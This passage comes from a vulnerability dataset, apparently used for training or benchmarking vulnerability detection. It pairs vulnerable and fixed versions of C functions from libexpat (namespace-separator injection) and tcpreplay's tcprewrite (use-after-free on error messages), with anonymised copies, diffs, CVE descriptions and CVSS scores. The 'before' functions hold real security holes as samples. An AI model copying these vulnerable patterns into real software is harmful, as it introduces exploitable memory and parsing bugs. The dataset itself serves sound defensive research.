if (prefix->name[3] == XML_T(ASCII_n) && prefix->name[4] == XML_T(ASCII_s)
&& prefix->name[5] == XML_T('\0'))
return XML_ERROR_RESERVED_PREFIX_XMLNS;
if (prefix->name[3] == XML_T('\0'))
mustBeXML = XML_TRUE;
}
for (len = 0; uri[len]; len++) {
if (isXML && (len > xmlLen || uri[len] != xmlNamespace[len]))
isXML = XML_FALSE;
if (! mustBeXML && isXMLNS
&& (len > xmlnsLen || uri[len] != xmlnsNamespace[len]))
isXMLNS = XML_FALSE;
}
isXML = isXML && len == xmlLen;
isXMLNS = isXMLNS && len == xmlnsLen;
if (mustBeXML != isXML)
return mustBeXML ? XML_ERROR_RESERVED_PREFIX_XML
: XML_ERROR_RESERVED_NAMESPACE_URI;
if (isXMLNS)
return XML_ERROR_RESERVED_NAMESPACE_URI;
if (parser->m_namespaceSeparator)
len++;
if (parser->m_freeBindingList) {
b = parser->m_freeBindingList;
if (len > b->uriAlloc) {
if (len > INT_MAX - EXPAND_SPARE) {
return XML_ERROR_NO_MEMORY;
}
#if UINT_MAX >= SIZE_MAX
if ((unsigned)(len + EXPAND_SPARE) > (size_t)(-1) / sizeof(XML_Char)) {
return XML_ERROR_NO_MEMORY;
}
#endif
XML_Char *temp = (XML_Char *)REALLOC(
parser, b->uri, sizeof(XML_Char) * (len + EXPAND_SPARE));
if (temp == NULL)
return XML_ERROR_NO_MEMORY;
b->uri = temp;
b->uriAlloc = len + EXPAND_SPARE;
}
parser->m_freeBindingList = b->nextTagBinding;
} else {
b = (BINDING *)MALLOC(parser, sizeof(BINDING));
if (! b)
return XML_ERROR_NO_MEMORY;
if (len > INT_MAX - EXPAND_SPARE) {
return XML_ERROR_NO_MEMORY;
}
#if UINT_MAX >= SIZE_MAX
if ((unsigned)(len + EXPAND_SPARE) > (size_t)(-1) / sizeof(XML_Char)) {
return XML_ERROR_NO_MEMORY;
}
#endif
b->uri
= (XML_Char *)MALLOC(parser, sizeof(XML_Char) * (len + EXPAND_SPARE));
if (! b->uri) {
FREE(parser, b);
return XML_ERROR_NO_MEMORY;
}
b->uriAlloc = len + EXPAND_SPARE;
}
b->uriLen = len;
memcpy(b->uri, uri, len * sizeof(XML_Char));
if (parser->m_namespaceSeparator)
b->uri[len - 1] = parser->m_namespaceSeparator;
b->prefix = prefix;
b->attId = attId;
b->prevPrefixBinding = prefix->binding;
if (*uri == XML_T('\0') && prefix == &parser->m_dtd->defaultPrefix)
prefix->binding = NULL;
else
prefix->binding = b;
b->nextTagBinding = *bindingsPtr;
*bindingsPtr = b;
if (attId && parser->m_startNamespaceDeclHandler)
parser->m_startNamespaceDeclHandler(parser->m_handlerArg, prefix->name,
prefix->binding ? uri : 0);
return XML_ERROR_NONE;
}","static enum XML_Error
addBinding(XML_Parser VAR_0, PREFIX *VAR_1, const ATTRIBUTE_ID *VAR_2,
const XML_Char *VAR_3, BINDING **VAR_4) {
static const XML_Char VAR_5[]
= {VAR_6,      VAR_7,     VAR_7,     VAR_8,      VAR_9,
VAR_10,  VAR_10, VAR_11,     VAR_11,      VAR_11,
VAR_12, VAR_11,     VAR_13,     VAR_12, VAR_14,
VAR_15,      VAR_16,     VAR_10, VAR_17,      VAR_18,
VAR_19,      VAR_10, VAR_20,     VAR_21,      VAR_21,
VAR_22,      VAR_10, VAR_23,     VAR_24,      VAR_25,
VAR_26,      VAR_27,     VAR_8,     VAR_24,      VAR_28,
VAR_26,      '\0'};
static const int VAR_29 = (int)sizeof(xmlNamespace) / sizeof(XML_Char) - 1;
static const XML_Char VAR_30[]
= {VAR_6,     VAR_7,      VAR_7, VAR_8, VAR_9,  VAR_10,
VAR_10, VAR_11,      VAR_11, VAR_11, VAR_12, VAR_11,
VAR_13,     VAR_12, VAR_14, VAR_15, VAR_16,      VAR_10,
VAR_31,     VAR_32,      VAR_32, VAR_32, VAR_10,  VAR_33,
VAR_25,     VAR_34,      VAR_23, VAR_27, VAR_10,  '\0'};
static const int VAR_35
= (int)sizeof(xmlnsNamespace) / sizeof(XML_Char) - 1;
XML_Bool VAR_36 = VAR_37;
XML_Bool VAR_38 = VAR_39;
XML_Bool VAR_40 = VAR_39;
BINDING *VAR_41;
int VAR_42;
if (*VAR_3 == XML_T('\0') && VAR_1->name)
return VAR_43;
if (VAR_1->name && VAR_1->name[0] == XML_T(VAR_33)
&& VAR_1->name[1] == XML_T(VAR_25)
&& VAR_1->name[2] == XML_T(VAR_34)) {
if (VAR_1->name[3] == XML_T(VAR_23) && VAR_1->name[4] == XML_T(VAR_27)
&& VAR_1->name[5] == XML_T('\0'))
return VAR_44;
if (VAR_1->name[3] == XML_T('\0'))
VAR_36 = VAR_39;
}
for (VAR_42 = 0; VAR_3[VAR_42]; VAR_42++) {
if (VAR_38 && (VAR_42 > VAR_29 || VAR_3[VAR_42] != xmlNamespace[VAR_42]))
VAR_38 = VAR_37;
if (! VAR_36 && VAR_40
&& (VAR_42 > VAR_35 || VAR_3[VAR_42] != xmlnsNamespace[VAR_42]))
VAR_40 = VAR_37;
}
VAR_38 = VAR_38 && VAR_42 == VAR_29;
VAR_40 = VAR_40 && VAR_42 == VAR_35;
if (VAR_36 != VAR_38)
return VAR_36 ? VAR_45
: VAR_46;
if (VAR_40)
return VAR_46;
if (VAR_0->m_namespaceSeparator)
VAR_42++;
if (VAR_0->m_freeBindingList) {
VAR_41 = VAR_0->m_freeBindingList;
if (VAR_42 > VAR_41->uriAlloc) {
if (VAR_42 > VAR_47 - VAR_48) {
return VAR_49;
}
#if VAR_50 >= VAR_51
if ((unsigned)(VAR_42 + VAR_48) > (size_t)(-1) / sizeof(XML_Char)) {
return VAR_49;
}
#endif
XML_Char *VAR_52 = (XML_Char *)REALLOC(
VAR_0, VAR_41->uri, sizeof(XML_Char) * (VAR_42 + VAR_48));
if (VAR_52 == NULL)
return VAR_49;
VAR_41->uri = VAR_52;
VAR_41->uriAlloc = VAR_42 + VAR_48;
}
VAR_0->m_freeBindingList = VAR_41->nextTagBinding;
} else {
VAR_41 = (BINDING *)MALLOC(VAR_0, sizeof(BINDING));
if (! VAR_41)
return VAR_49;
if (VAR_42 > VAR_47 - VAR_48) {
return VAR_49;
}
#if VAR_50 >= VAR_51
if ((unsigned)(VAR_42 + VAR_48) > (size_t)(-1) / sizeof(XML_Char)) {
return VAR_49;
}
#endif
VAR_41->uri
= (XML_Char *)MALLOC(VAR_0, sizeof(XML_Char) * (VAR_42 + VAR_48));
if (! VAR_41->uri) {
FREE(VAR_0, VAR_41);
return VAR_49;
}
VAR_41->uriAlloc = VAR_42 + VAR_48;
}
VAR_41->uriLen = VAR_42;
memcpy(VAR_41->uri, VAR_3, VAR_42 * sizeof(XML_Char));
if (VAR_0->m_namespaceSeparator)
VAR_41->uri[VAR_42 - 1] = VAR_0->m_namespaceSeparator;
VAR_41->prefix = VAR_1;
VAR_41->attId = VAR_2;
VAR_41->prevPrefixBinding = VAR_1->binding;
if (*VAR_3 == XML_T('\0') && VAR_1 == &VAR_0->m_dtd->defaultPrefix)
VAR_1->binding = NULL;
else
VAR_1->binding = VAR_41;
VAR_41->nextTagBinding = *VAR_4;
*VAR_4 = VAR_41;
if (VAR_2 && VAR_0->m_startNamespaceDeclHandler)
VAR_0->m_startNamespaceDeclHandler(VAR_0->m_handlerArg, VAR_1->name,
VAR_1->binding ? VAR_3 : 0);
return VAR_53;
}",libexpat/a2fe525e660badd64b6c557c2b1ec26ddc07f6e4/xmlparse.c/vul/before/0.json,"static enum XML_Error
addBinding(XML_Parser parser, PREFIX *prefix, const ATTRIBUTE_ID *attId,
           const XML_Char *uri, BINDING **bindingsPtr) {
  static const XML_Char xmlNamespace[]
      = {ASCII_h,      ASCII_t,     ASCII_t,     ASCII_p,      ASCII_COLON,
         ASCII_SLASH,  ASCII_SLASH, ASCII_w,     ASCII_w,      ASCII_w,
         ASCII_PERIOD, ASCII_w,     ASCII_3,     ASCII_PERIOD, ASCII_o,
         ASCII_r,      ASCII_g,     ASCII_SLASH, ASCII_X,      ASCII_M,
         ASCII_L,      ASCII_SLASH, ASCII_1,     ASCII_9,      ASCII_9,
         ASCII_8,      ASCII_SLASH, ASCII_n,     ASCII_a,      ASCII_m,
         ASCII_e,      ASCII_s,     ASCII_p,     ASCII_a,      ASCII_c,
         ASCII_e,      '\0'};
  static const int xmlLen = (int)sizeof(xmlNamespace) / sizeof(XML_Char) - 1;
  static const XML_Char xmlnsNamespace[]
      = {ASCII_h,     ASCII_t,      ASCII_t, ASCII_p, ASCII_COLON,  ASCII_SLASH,
         ASCII_SLASH, ASCII_w,      ASCII_w, ASCII_w, ASCII_PERIOD, ASCII_w,
         ASCII_3,     ASCII_PERIOD, ASCII_o, ASCII_r, ASCII_g,      ASCII_SLASH,
         ASCII_2,     ASCII_0,      ASCII_0, ASCII_0, ASCII_SLASH,  ASCII_x,
         ASCII_m,     ASCII_l,      ASCII_n, ASCII_s, ASCII_SLASH,  '\0'};
  static const int xmlnsLen
      = (int)sizeof(xmlnsNamespace) / sizeof(XML_Char) - 1;

  XML_Bool mustBeXML = XML_FALSE;
  XML_Bool isXML = XML_TRUE;
  XML_Bool isXMLNS = XML_TRUE;

  BINDING *b;
  int len;

  /* empty URI is only valid for default namespace per XML NS 1.0 (not 1.1) */
  if (*uri == XML_T('\0') && prefix->name)
    return XML_ERROR_UNDECLARING_PREFIX;

  if (prefix->name && prefix->name[0] == XML_T(ASCII_x)
      && prefix->name[1] == XML_T(ASCII_m)
      && prefix->name[2] == XML_T(ASCII_l)) {
    /* Not allowed to bind xmlns */
    if (prefix->name[3] == XML_T(ASCII_n) && prefix->name[4] == XML_T(ASCII_s)
        && prefix->name[5] == XML_T('\0'))
      return XML_ERROR_RESERVED_PREFIX_XMLNS;

    if (prefix->name[3] == XML_T('\0'))
      mustBeXML = XML_TRUE;
  }

  for (len = 0; uri[len]; len++) {
    if (isXML && (len > xmlLen || uri[len] != xmlNamespace[len]))
      isXML = XML_FALSE;

    if (! mustBeXML && isXMLNS
        && (len > xmlnsLen || uri[len] != xmlnsNamespace[len]))
      isXMLNS = XML_FALSE;

    // NOTE: While Expat does not validate namespace URIs against RFC 3986,
    //       we have to at least make sure that the XML processor on top of
    //       Expat (that is splitting tag names by namespace separator into
    //       2- or 3-tuples (uri-local or uri-local-prefix)) cannot be confused
    //       by an attacker putting additional namespace separator characters
    //       into namespace declarations.  That would be ambiguous and not to
    //       be expected.
    if (parser->m_ns && (uri[len] == parser->m_namespaceSeparator)) {
      return XML_ERROR_SYNTAX;
    }
  }
  isXML = isXML && len == xmlLen;
  isXMLNS = isXMLNS && len == xmlnsLen;

  if (mustBeXML != isXML)
    return mustBeXML ? XML_ERROR_RESERVED_PREFIX_XML
                     : XML_ERROR_RESERVED_NAMESPACE_URI;

  if (isXMLNS)
    return XML_ERROR_RESERVED_NAMESPACE_URI;

  if (parser->m_namespaceSeparator)
    len++;
  if (parser->m_freeBindingList) {
    b = parser->m_freeBindingList;
    if (len > b->uriAlloc) {
      /* Detect and prevent integer overflow */
      if (len > INT_MAX - EXPAND_SPARE) {
        return XML_ERROR_NO_MEMORY;
      }

      /* Detect and prevent integer overflow.
       * The preprocessor guard addresses the ""always false"" warning
       * from -Wtype-limits on platforms where
       * sizeof(unsigned int) < sizeof(size_t), e.g. on x86_64. */
#if UINT_MAX >= SIZE_MAX
      if ((unsigned)(len + EXPAND_SPARE) > (size_t)(-1) / sizeof(XML_Char)) {
        return XML_ERROR_NO_MEMORY;
      }
#endif

      XML_Char *temp = (XML_Char *)REALLOC(
          parser, b->uri, sizeof(XML_Char) * (len + EXPAND_SPARE));
      if (temp == NULL)
        return XML_ERROR_NO_MEMORY;
      b->uri = temp;
      b->uriAlloc = len + EXPAND_SPARE;
    }
    parser->m_freeBindingList = b->nextTagBinding;
  } else {
    b = (BINDING *)MALLOC(parser, sizeof(BINDING));
    if (! b)
      return XML_ERROR_NO_MEMORY;

    /* Detect and prevent integer overflow */
    if (len > INT_MAX - EXPAND_SPARE) {
      return XML_ERROR_NO_MEMORY;
    }
    /* Detect and prevent integer overflow.
     * The preprocessor guard addresses the ""always false"" warning
     * from -Wtype-limits on platforms where
     * sizeof(unsigned int) < sizeof(size_t), e.g. on x86_64. */
#if UINT_MAX >= SIZE_MAX
    if ((unsigned)(len + EXPAND_SPARE) > (size_t)(-1) / sizeof(XML_Char)) {
      return XML_ERROR_NO_MEMORY;
    }
#endif

    b->uri
        = (XML_Char *)MALLOC(parser, sizeof(XML_Char) * (len + EXPAND_SPARE));
    if (! b->uri) {
      FREE(parser, b);
      return XML_ERROR_NO_MEMORY;
    }
    b->uriAlloc = len + EXPAND_SPARE;
  }
  b->uriLen = len;
  memcpy(b->uri, uri, len * sizeof(XML_Char));
  if (parser->m_namespaceSeparator)
    b->uri[len - 1] = parser->m_namespaceSeparator;
  b->prefix = prefix;
  b->attId = attId;
  b->prevPrefixBinding = prefix->binding;
  /* NULL binding when default namespace undeclared */
  if (*uri == XML_T('\0') && prefix == &parser->m_dtd->defaultPrefix)
    prefix->binding = NULL;
  else
    prefix->binding = b;
  b->nextTagBinding = *bindingsPtr;
  *bindingsPtr = b;
  /* if attId == NULL then we are not starting a namespace scope */
  if (attId && parser->m_startNamespaceDeclHandler)
    parser->m_startNamespaceDeclHandler(parser->m_handlerArg, prefix->name,
                                        prefix->binding ? uri : 0);
  return XML_ERROR_NONE;
}","static enum XML_Error
addBinding(XML_Parser VAR_0, PREFIX *VAR_1, const ATTRIBUTE_ID *VAR_2,
           const XML_Char *VAR_3, BINDING **VAR_4) {
  static const XML_Char VAR_5[]
      = {VAR_6,      VAR_7,     VAR_7,     VAR_8,      VAR_9,
         VAR_10,  VAR_10, VAR_11,     VAR_11,      VAR_11,
         VAR_12, VAR_11,     VAR_13,     VAR_12, VAR_14,
         VAR_15,      VAR_16,     VAR_10, VAR_17,      VAR_18,
         VAR_19,      VAR_10, VAR_20,     VAR_21,      VAR_21,
         VAR_22,      VAR_10, VAR_23,     VAR_24,      VAR_25,
         VAR_26,      VAR_27,     VAR_8,     VAR_24,      VAR_28,
         VAR_26,      '\0'};
  static const int VAR_29 = (int)sizeof(xmlNamespace) / sizeof(XML_Char) - 1;
  static const XML_Char VAR_30[]
      = {VAR_6,     VAR_7,      VAR_7, VAR_8, VAR_9,  VAR_10,
         VAR_10, VAR_11,      VAR_11, VAR_11, VAR_12, VAR_11,
         VAR_13,     VAR_12, VAR_14, VAR_15, VAR_16,      VAR_10,
         VAR_31,     VAR_32,      VAR_32, VAR_32, VAR_10,  VAR_33,
         VAR_25,     VAR_34,      VAR_23, VAR_27, VAR_10,  '\0'};
  static const int VAR_35
      = (int)sizeof(xmlnsNamespace) / sizeof(XML_Char) - 1;

  XML_Bool VAR_36 = VAR_37;
  XML_Bool VAR_38 = VAR_39;
  XML_Bool VAR_40 = VAR_39;

  BINDING *VAR_41;
  int VAR_42;

  /* COMMENT_0 */
  if (*VAR_3 == XML_T('\0') && VAR_1->name)
    return VAR_43;

  if (VAR_1->name && VAR_1->name[0] == XML_T(VAR_33)
      && VAR_1->name[1] == XML_T(VAR_25)
      && VAR_1->name[2] == XML_T(VAR_34)) {
    /* COMMENT_1 */
    if (VAR_1->name[3] == XML_T(VAR_23) && VAR_1->name[4] == XML_T(VAR_27)
        && VAR_1->name[5] == XML_T('\0'))
      return VAR_44;

    if (VAR_1->name[3] == XML_T('\0'))
      VAR_36 = VAR_39;
  }

  for (VAR_42 = 0; VAR_3[VAR_42]; VAR_42++) {
    if (VAR_38 && (VAR_42 > VAR_29 || VAR_3[VAR_42] != xmlNamespace[VAR_42]))
      VAR_38 = VAR_37;

    if (! VAR_36 && VAR_40
        && (VAR_42 > VAR_35 || VAR_3[VAR_42] != xmlnsNamespace[VAR_42]))
      VAR_40 = VAR_37;

    /* COMMENT_2 */
    /* COMMENT_3 */
    /* COMMENT_4 */
    /* COMMENT_5 */
    /* COMMENT_6 */
    /* COMMENT_7 */
    /* COMMENT_8 */
    if (VAR_0->m_ns && (VAR_3[VAR_42] == VAR_0->m_namespaceSeparator)) {
      return VAR_45;
    }
  }
  VAR_38 = VAR_38 && VAR_42 == VAR_29;
  VAR_40 = VAR_40 && VAR_42 == VAR_35;

  if (VAR_36 != VAR_38)
    return VAR_36 ? VAR_46
                     : VAR_47;

  if (VAR_40)
    return VAR_47;

  if (VAR_0->m_namespaceSeparator)
    VAR_42++;
  if (VAR_0->m_freeBindingList) {
    VAR_41 = VAR_0->m_freeBindingList;
    if (VAR_42 > VAR_41->uriAlloc) {
      /* COMMENT_9 */
      if (VAR_42 > VAR_48 - VAR_49) {
        return VAR_50;
      }

      /* COMMENT_10 */
                                                                    
                                              
                                                                  
#if VAR_51 >= VAR_52
      if ((unsigned)(VAR_42 + VAR_49) > (size_t)(-1) / sizeof(XML_Char)) {
        return VAR_50;
      }
#endif

      XML_Char *VAR_53 = (XML_Char *)REALLOC(
          VAR_0, VAR_41->uri, sizeof(XML_Char) * (VAR_42 + VAR_49));
      if (VAR_53 == NULL)
        return VAR_50;
      VAR_41->uri = VAR_53;
      VAR_41->uriAlloc = VAR_42 + VAR_49;
    }
    VAR_0->m_freeBindingList = VAR_41->nextTagBinding;
  } else {
    VAR_41 = (BINDING *)MALLOC(VAR_0, sizeof(BINDING));
    if (! VAR_41)
      return VAR_50;

    /* COMMENT_9 */
    if (VAR_42 > VAR_48 - VAR_49) {
      return VAR_50;
    }
    /* COMMENT_14 */
                                                                  
                                            
                                                                
#if VAR_51 >= VAR_52
    if ((unsigned)(VAR_42 + VAR_49) > (size_t)(-1) / sizeof(XML_Char)) {
      return VAR_50;
    }
#endif

    VAR_41->uri
        = (XML_Char *)MALLOC(VAR_0, sizeof(XML_Char) * (VAR_42 + VAR_49));
    if (! VAR_41->uri) {
      FREE(VAR_0, VAR_41);
      return VAR_50;
    }
    VAR_41->uriAlloc = VAR_42 + VAR_49;
  }
  VAR_41->uriLen = VAR_42;
  memcpy(VAR_41->uri, VAR_3, VAR_42 * sizeof(XML_Char));
  if (VAR_0->m_namespaceSeparator)
    VAR_41->uri[VAR_42 - 1] = VAR_0->m_namespaceSeparator;
  VAR_41->prefix = VAR_1;
  VAR_41->attId = VAR_2;
  VAR_41->prevPrefixBinding = VAR_1->binding;
  /* COMMENT_18 */
  if (*VAR_3 == XML_T('\0') && VAR_1 == &VAR_0->m_dtd->defaultPrefix)
    VAR_1->binding = NULL;
  else
    VAR_1->binding = VAR_41;
  VAR_41->nextTagBinding = *VAR_4;
  *VAR_4 = VAR_41;
  /* COMMENT_19 */
  if (VAR_2 && VAR_0->m_startNamespaceDeclHandler)
    VAR_0->m_startNamespaceDeclHandler(VAR_0->m_handlerArg, VAR_1->name,
                                        VAR_1->binding ? VAR_3 : 0);
  return VAR_54;
}",libexpat/a2fe525e660badd64b6c557c2b1ec26ddc07f6e4/xmlparse.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -50,6 +50,17 @@
     if (! mustBeXML && isXMLNS
         && (len > xmlnsLen || uri[len] != xmlnsNamespace[len]))
       isXMLNS = XML_FALSE;
+
+    // NOTE: While Expat does not validate namespace URIs against RFC 3986,
+    //       we have to at least make sure that the XML processor on top of
+    //       Expat (that is splitting tag names by namespace separator into
+    //       2- or 3-tuples (uri-local or uri-local-prefix)) cannot be confused
+    //       by an attacker putting additional namespace separator characters
+    //       into namespace declarations.  That would be ambiguous and not to
+    //       be expected.
+    if (parser->m_ns && (uri[len] == parser->m_namespaceSeparator)) {
+      return XML_ERROR_SYNTAX;
+    }
   }
   isXML = isXML && len == xmlLen;
   isXMLNS = isXMLNS && len == xmlnsLen;","{'deleted_lines': [], 'added_lines': ['', '    // NOTE: While Expat does not validate namespace URIs against RFC 3986,', '    //       we have to at least make sure that the XML processor on top of', '    //       Expat (that is splitting tag names by namespace separator into', '    //       2- or 3-tuples (uri-local or uri-local-prefix)) cannot be confused', '    //       by an attacker putting additional namespace separator characters', '    //       into namespace declarations.  That would be ambiguous and not to', '    //       be expected.', '    if (parser->m_ns && (uri[len] == parser->m_namespaceSeparator)) {', '      return XML_ERROR_SYNTAX;', '    }']}",True,xmlparse.c in Expat (aka libexpat) before 2.4.5 allows attackers to insert namespace-separator characters into namespace URIs.,9.8,CRITICAL,3,valid,2022-02-12T00:09:29Z,4
CVE-2022-27418,['CWE-787'],AV:N/AC:H/Au:N/C:P/I:P/A:P,0,appneta/tcpreplay,Bug #703 fix use-after-free on error messages,7248ddb7ddd363b15b86e65022773f791764c33a,https://github.com/appneta/tcpreplay/commit/7248ddb7ddd363b15b86e65022773f791764c33a,src/tcprewrite.c,main,"int 
main(int argc, char *argv[])
{
int optct, rcode;
pcap_t *dlt_pcap;
#ifdef ENABLE_FRAGROUTE
char ebuf[FRAGROUTE_ERRBUF_LEN];
#endif
tcprewrite_init();
optct = optionProcess(&tcprewriteOptions, argc, argv);
argc -= optct;
argv += optct;
post_args(argc, argv);
if (tcpedit_init(&tcpedit, pcap_datalink(options.pin)) < 0) {
errx(-1, ""Error initializing tcpedit: %s"", tcpedit_geterr(tcpedit));
}
rcode = tcpedit_post_args(tcpedit);
if (rcode < 0) {
tcpedit_close(&tcpedit);
errx(-1, ""Unable to parse args: %s"", tcpedit_geterr(tcpedit));
} else if (rcode == 1) {
warnx(""%s"", tcpedit_geterr(tcpedit));
}
if (tcpedit_validate(tcpedit) < 0) {
tcpedit_close(&tcpedit);
errx(-1, ""Unable to edit packets given options:\n%s"",
tcpedit_geterr(tcpedit));
}
fuzzing_init(tcpedit->fuzz_seed, tcpedit->fuzz_factor);
options.outfile = safe_strdup(OPT_ARG(OUTFILE));
dbgx(1, ""Rewriting DLT to %s"",
pcap_datalink_val_to_name(tcpedit_get_output_dlt(tcpedit)));
if ((dlt_pcap = pcap_open_dead(tcpedit_get_output_dlt(tcpedit), 65535)) == NULL) {
tcpedit_close(&tcpedit);
err(-1, ""Unable to open dead pcap handle."");
}
dbgx(1, ""DLT of dlt_pcap is %s"",
pcap_datalink_val_to_name(pcap_datalink(dlt_pcap)));
#ifdef ENABLE_FRAGROUTE
if (options.fragroute_args) {
if ((options.frag_ctx = fragroute_init(65535, pcap_datalink(dlt_pcap), options.fragroute_args, ebuf)) == NULL) {
tcpedit_close(&tcpedit);
errx(-1, ""%s"", ebuf);
}
}
#endif
#ifdef ENABLE_VERBOSE
if (options.verbose) {
tcpdump_open(&tcpdump, dlt_pcap);
}
#endif
if ((options.pout = pcap_dump_open(dlt_pcap, options.outfile)) == NULL) {
tcpedit_close(&tcpedit);
errx(-1, ""Unable to open output pcap file: %s"", pcap_geterr(dlt_pcap));
}
pcap_close(dlt_pcap);
if (rewrite_packets(tcpedit, options.pin, options.pout) == TCPEDIT_ERROR) {
tcpedit_close(&tcpedit);
errx(-1, ""Error rewriting packets: %s"", tcpedit_geterr(tcpedit));
}
pcap_dump_close(options.pout);
pcap_close(options.pin);
tcpedit_close(&tcpedit);
#ifdef ENABLE_VERBOSE
tcpdump_close(&tcpdump);
#endif
#ifdef ENABLE_FRAGROUTE
if (options.frag_ctx) {
fragroute_close(options.frag_ctx);
}
#endif
#ifdef ENABLE_DMALLOC
dmalloc_shutdown();
#endif
restore_stdin();
return 0;
}","int 
main(int VAR_0, char *VAR_1[])
{
int VAR_2, VAR_3;
pcap_t *VAR_4;
#ifdef VAR_5
char VAR_6[VAR_7];
#endif
tcprewrite_init();
VAR_2 = optionProcess(&VAR_8, VAR_0, VAR_1);
VAR_0 -= VAR_2;
VAR_1 += VAR_2;
post_args(VAR_0, VAR_1);
if (tcpedit_init(&VAR_9, pcap_datalink(VAR_10.pin)) < 0) {
errx(-1, ""Error initializing tcpedit: %s"", tcpedit_geterr(VAR_9));
}
VAR_3 = tcpedit_post_args(VAR_9);
if (VAR_3 < 0) {
tcpedit_close(&VAR_9);
errx(-1, ""Unable to parse args: %s"", tcpedit_geterr(VAR_9));
} else if (VAR_3 == 1) {
warnx(""%s"", tcpedit_geterr(VAR_9));
}
if (tcpedit_validate(VAR_9) < 0) {
tcpedit_close(&VAR_9);
errx(-1, ""Unable to edit packets given options:\n%s"",
tcpedit_geterr(VAR_9));
}
fuzzing_init(VAR_9->fuzz_seed, VAR_9->fuzz_factor);
VAR_10.outfile = safe_strdup(OPT_ARG(VAR_11));
dbgx(1, ""Rewriting DLT to %s"",
pcap_datalink_val_to_name(tcpedit_get_output_dlt(VAR_9)));
if ((VAR_4 = pcap_open_dead(tcpedit_get_output_dlt(VAR_9), 65535)) == NULL) {
tcpedit_close(&VAR_9);
err(-1, ""Unable to open dead pcap handle."");
}
dbgx(1, ""DLT of dlt_pcap is %s"",
pcap_datalink_val_to_name(pcap_datalink(VAR_4)));
#ifdef VAR_5
if (VAR_10.fragroute_args) {
if ((VAR_10.frag_ctx = fragroute_init(65535, pcap_datalink(VAR_4), VAR_10.fragroute_args, VAR_6)) == NULL) {
tcpedit_close(&VAR_9);
errx(-1, ""%s"", VAR_6);
}
}
#endif
#ifdef VAR_12
if (VAR_10.verbose) {
tcpdump_open(&VAR_13, VAR_4);
}
#endif
if ((VAR_10.pout = pcap_dump_open(VAR_4, VAR_10.outfile)) == NULL) {
tcpedit_close(&VAR_9);
errx(-1, ""Unable to open output pcap file: %s"", pcap_geterr(VAR_4));
}
pcap_close(VAR_4);
if (rewrite_packets(VAR_9, VAR_10.pin, VAR_10.pout) == VAR_14) {
tcpedit_close(&VAR_9);
errx(-1, ""Error rewriting packets: %s"", tcpedit_geterr(VAR_9));
}
pcap_dump_close(VAR_10.pout);
pcap_close(VAR_10.pin);
tcpedit_close(&VAR_9);
#ifdef VAR_12
tcpdump_close(&VAR_13);
#endif
#ifdef VAR_5
if (VAR_10.frag_ctx) {
fragroute_close(VAR_10.frag_ctx);
}
#endif
#ifdef VAR_15
dmalloc_shutdown();
#endif
restore_stdin();
return 0;
}",appneta/tcpreplay/7248ddb7ddd363b15b86e65022773f791764c33a/tcprewrite.c/vul/before/0.json,"int 
main(int argc, char *argv[])
{
    int optct, rcode;
    pcap_t *dlt_pcap;
#ifdef ENABLE_FRAGROUTE
    char ebuf[FRAGROUTE_ERRBUF_LEN];
#endif
    tcprewrite_init();

    /* call autoopts to process arguments */
    optct = optionProcess(&tcprewriteOptions, argc, argv);
    argc -= optct;
    argv += optct;

    /* parse the tcprewrite args */
    post_args(argc, argv);

    /* init tcpedit context */
    if (tcpedit_init(&tcpedit, pcap_datalink(options.pin)) < 0) {
        err_no_exitx(""Error initializing tcpedit: %s"", tcpedit_geterr(tcpedit));
        tcpedit_close(&tcpedit);
        exit(-1);
    }

    /* parse the tcpedit args */
    rcode = tcpedit_post_args(tcpedit);
    if (rcode < 0) {
        err_no_exitx(""Unable to parse args: %s"", tcpedit_geterr(tcpedit));
        tcpedit_close(&tcpedit);
        exit(-1);
    } else if (rcode == 1) {
        warnx(""%s"", tcpedit_geterr(tcpedit));
    }

    if (tcpedit_validate(tcpedit) < 0) {
        err_no_exitx(""Unable to edit packets given options:\n%s"",
                tcpedit_geterr(tcpedit));
        tcpedit_close(&tcpedit);
        exit(-1);
    }

    /* fuzzing init */
    fuzzing_init(tcpedit->fuzz_seed, tcpedit->fuzz_factor);

   /* open up the output file */
    options.outfile = safe_strdup(OPT_ARG(OUTFILE));
    dbgx(1, ""Rewriting DLT to %s"",
            pcap_datalink_val_to_name(tcpedit_get_output_dlt(tcpedit)));
    if ((dlt_pcap = pcap_open_dead(tcpedit_get_output_dlt(tcpedit), 65535)) == NULL) {
        tcpedit_close(&tcpedit);
        err(-1, ""Unable to open dead pcap handle."");
    }

    dbgx(1, ""DLT of dlt_pcap is %s"",
        pcap_datalink_val_to_name(pcap_datalink(dlt_pcap)));

#ifdef ENABLE_FRAGROUTE
    if (options.fragroute_args) {
        if ((options.frag_ctx = fragroute_init(65535, pcap_datalink(dlt_pcap), options.fragroute_args, ebuf)) == NULL) {
            err_no_exitx(""%s"", ebuf);
            tcpedit_close(&tcpedit);
            exit(-1);
        }
    }
#endif

#ifdef ENABLE_VERBOSE
    if (options.verbose) {
        tcpdump_open(&tcpdump, dlt_pcap);
    }
#endif

    if ((options.pout = pcap_dump_open(dlt_pcap, options.outfile)) == NULL) {
        err_no_exitx(""Unable to open output pcap file: %s"", pcap_geterr(dlt_pcap));
        tcpedit_close(&tcpedit);
        exit(-1);
    }

    pcap_close(dlt_pcap);

    /* rewrite packets */
    if (rewrite_packets(tcpedit, options.pin, options.pout) == TCPEDIT_ERROR) {
        err_no_exitx(""Error rewriting packets: %s"", tcpedit_geterr(tcpedit));
        tcpedit_close(&tcpedit);
        exit(-1);
    }

    /* clean up after ourselves */
    pcap_dump_close(options.pout);
    pcap_close(options.pin);
    tcpedit_close(&tcpedit);

#ifdef ENABLE_VERBOSE
    tcpdump_close(&tcpdump);
#endif

#ifdef ENABLE_FRAGROUTE
    if (options.frag_ctx) {
        fragroute_close(options.frag_ctx);
    }
#endif

#ifdef ENABLE_DMALLOC
    dmalloc_shutdown();
#endif

    restore_stdin();
    return 0;
}","int 
main(int VAR_0, char *VAR_1[])
{
    int VAR_2, VAR_3;
    pcap_t *VAR_4;
#ifdef VAR_5
    char VAR_6[VAR_7];
#endif
    tcprewrite_init();

    /* COMMENT_0 */
    VAR_2 = optionProcess(&VAR_8, VAR_0, VAR_1);
    VAR_0 -= VAR_2;
    VAR_1 += VAR_2;

    /* COMMENT_1 */
    post_args(VAR_0, VAR_1);

    /* COMMENT_2 */
    if (tcpedit_init(&VAR_9, pcap_datalink(VAR_10.pin)) < 0) {
        err_no_exitx(""Error initializing tcpedit: %s"", tcpedit_geterr(VAR_9));
        tcpedit_close(&VAR_9);
        exit(-1);
    }

    /* COMMENT_3 */
    VAR_3 = tcpedit_post_args(VAR_9);
